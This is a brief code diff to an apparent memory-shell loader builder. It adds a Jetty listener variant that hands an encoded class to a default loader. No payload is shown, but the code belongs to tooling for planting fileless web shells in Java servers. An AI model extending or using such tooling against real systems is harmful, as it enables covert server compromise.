@@ -142,6 +142,16 @@ public class MSLoaderBuilder {
         return defaultLoader(cls, MSGzipBase64, javaClassHelper);
     }
 
+    /**
+     * Jetty
+     */
+    @Middleware(Middleware.Jetty)
+    @MemShell(MemShell.Listener)
+    public byte[] jettyListener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+
+    }
+
 
     /**
      * 直接加载
